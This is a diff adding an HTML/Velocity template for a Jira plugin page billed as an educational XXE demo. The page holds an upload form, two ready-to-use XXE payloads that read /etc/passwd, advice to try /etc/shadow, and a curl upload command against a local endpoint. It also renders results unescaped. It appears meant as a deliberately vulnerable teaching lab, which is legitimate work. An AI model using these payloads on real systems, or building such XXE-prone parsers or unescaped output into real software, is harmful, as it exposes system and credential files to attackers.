@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Spreadsheet XML Upload - Educational XXE Demo</title>
+    <meta name="decorator" content="atl.admin">
+    $webResourceManager.requireResource("com.atlassian.spreadsheets.spreadsheetsForJira:spreadsheetsForJira-resources")
+    <style>
+        .vulnerable-warning {
+            background-color: #ffebee;
+            border: 2px solid #f44336;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            color: #d32f2f;
+            font-weight: bold;
+        }
+        .upload-form {
+            background: #f5f5f5;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .result-box {
+            background: #e8f5e8;
+            border: 1px solid #4caf50;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .error-box {
+            background: #ffebee;
+            border: 1px solid #f44336;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            color: #d32f2f;
+        }
+        .example-box {
+            background: #fff3e0;
+            border: 1px solid #ff9800;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        .example-xml {
+            background: #f5f5f5;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 11px;
+            white-space: pre-wrap;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <header class="aui-page-header">
+        <div class="aui-page-header-inner">
+            <div class="aui-page-header-main">
+                <h1>Spreadsheet XML Processor</h1>
+                <p class="aui-page-header-description">Educational XXE Vulnerability Demonstration</p>
+            </div>
+        </div>
+    </header>
+
+    <div class="aui-page-panel">
+        <div class="aui-page-panel-inner">
+            <section class="aui-page-panel-content">
+                
+                <div class="vulnerable-warning">
+                    ⚠️ <strong>WARNING:</strong> This tool is intentionally vulnerable to XXE attacks for educational purposes only!
+                    <br/>Do NOT use in production environments!
+                </div>
+
+                #if ($error)
+                    <div class="error-box">
+                        <strong>Error:</strong> $error
+                    </div>
+                #end
+
+                <div class="upload-form">
+                    <h3>Upload XML File</h3>
+                    <form id="xml-upload-form" action="SpreadsheetUpload!upload.jspa" method="post" enctype="multipart/form-data" class="aui" data-behavior="rest-upload">
+                        <input type="hidden" name="atl_token" value="$atl_token"/>
+                        <div class="field-group">
+                            <label for="upload-file">Choose XML file:</label>
+                            <input type="file" id="upload-file" name="file" accept=".xml,.txt" required>
+                            <div class="description">Select an XML file to process (supports both spreadsheet and testsuite formats)</div>
+                        </div>
+                        <div class="buttons-container">
+                            <div class="buttons">
+                                <input id="process-file-btn" type="button" value="Process File" class="aui-button aui-button-primary">
+                                <input id="validate-only-btn" type="button" value="Validate Only" class="aui-button">
+                            </div>
+                        </div>
+                    </form>
+                    <div id="client-error" class="error-box" style="display:none"></div>
+                    <div id="client-result" class="result-box" style="display:none"></div>
+                </div>
+
+                <div class="example-box">
+                    <h3>📝 Example XXE Payload (Testsuite Format)</h3>
+                    <p>Save this as <code>malicious.xml</code> and upload it to demonstrate the XXE vulnerability:</p>
+                    <textarea class="example-xml" readonly rows="16" style="width:100%"><?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE testsuite [
+    <!ENTITY passwd SYSTEM "file:///etc/passwd">
+]>
+<testsuite tests="1" failures="0" name="ut.com.xpandit.raven.service.impl.IssueDataSetTest" time="0.163" errors="0" skipped="0">
+  <properties>
+    <property name="environment">&passwd;</property>
+    <property name="testrun_comment">&passwd;</property>
+    <property name="config">&passwd;</property>
+  </properties>
+  <testcase classname="ut.com.xpandit.raven.service.impl.IssueDataSetTest" name="testApplyOptions_withValidIssueAndValidLimitOverflowOption_returnsExpectedSubsett" time="0.114">
+    <failure>&passwd;</failure>
+  </testcase>
+</testsuite></textarea>
+                    
+                    <h4>Alternative Spreadsheet Format:</h4>
+                    <textarea class="example-xml" readonly rows="18" style="width:100%"><?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE spreadsheet [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<spreadsheet>
+  <row id="1">
+    <cell column="A">&xxe;</cell>
+    <cell column="B">Header 2</cell>
+  </row>
+  <row id="2">
+    <cell column="A">Data 1</cell>
+    <cell column="B">&xxe;</cell>
+  </row>
+</spreadsheet></textarea>
+                </div>
+
+                #if ($result)
+                    <div class="result-box">
+                        <h3>📊 Processing Result</h3>
+$result
+                    </div>
+                #end
+
+                <div class="example-box">
+                    <h3>🔍 How to Test</h3>
+                    <ol>
+                        <li>Copy one of the example payloads above</li>
+                        <li>Save it as an <code>.xml</code> file</li>
+                        <li>Upload it using the form above</li>
+                        <li>Check the result - you should see file contents if XXE worked</li>
+                        <li>Try different file paths like <code>file:///etc/hosts</code> or <code>file:///etc/shadow</code></li>
+                    </ol>
+                    
+                    <h4>📡 REST API Alternative:</h4>
+                    <p>You can also test via cURL:</p>
+                    <div class="example-xml">curl -H "Content-Type: multipart/form-data" \
+  -F "file=@malicious.xml" \
+  "http://localhost:2990/jira/rest/spreadsheet/1.0/upload"</div>
+                </div>
+
+            </section>
+        </div>
+    </div>
+</body>
+</html>
